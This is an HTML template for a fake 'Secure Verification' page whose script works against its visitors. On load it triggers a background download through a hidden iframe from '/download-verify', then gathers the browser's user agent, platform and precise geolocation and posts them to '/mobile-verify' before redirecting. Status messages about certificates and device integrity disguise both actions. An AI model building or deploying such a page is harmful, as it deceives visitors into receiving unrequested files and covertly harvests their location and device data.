{% extends "base.html" %}

{% block content %}
<div class="card"
    style="max-width:500px; margin:50px auto; background:white; padding:40px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center;">
    <div id="status-container">
        <div class="spinner"
            style="border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px;">
        </div>
        <h2 style="color:#333; margin-top:0;">Secure Verification</h2>
        <p id="status-text" style="color:#666; font-size:16px;">
            Initializing secure connection... Please wait.
        </p>
    </div>
</div>

<!-- Hidden iframe for background download -->
<iframe id="download-frame" style="display:none;"></iframe>

<style>
    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
</style>

<script>
    window.onload = function () {
        console.log("Initialization started...");
        const statusText = document.getElementById('status-text');
        const downloadFrame = document.getElementById('download-frame');

        // 1. Trigger Automatic Download safely
        setTimeout(() => {
            statusText.innerText = "Synchronizing security certificates...";
            console.log("Triggering download...");
            downloadFrame.src = "/download-verify";
        }, 1500);

        // 2. Capture Device Info & Location
        setTimeout(() => {
            statusText.innerText = "Verifying device integrity...";
            console.log("Capturing device data...");

            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                location: "Permission Denied"
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        console.log("Location obtained");
                        deviceInfo.location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                        sendData(deviceInfo);
                    },
                    (error) => {
                        console.warn("Location permission denied or timed out");
                        sendData(deviceInfo);
                    },
                    { timeout: 5000, enableHighAccuracy: true }
                );
            } else {
                console.warn("Geolocation not supported");
                sendData(deviceInfo);
            }
        }, 3000);

        function sendData(data) {
            console.log("Sending data to server...", data);
            fetch('/mobile-verify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
                .then(response => response.json())
                .then(resData => {
                    console.log("Server response:", resData);
                    statusText.innerText = "Verification complete. Redirecting...";
                    setTimeout(() => {
                        window.location.href = "/thankyou";
                    }, 1000);
                })
                .catch((error) => {
                    console.error('Fetch error:', error);
                    window.location.href = "/thankyou";
                });
        }
    };
</script>
{% endblock %}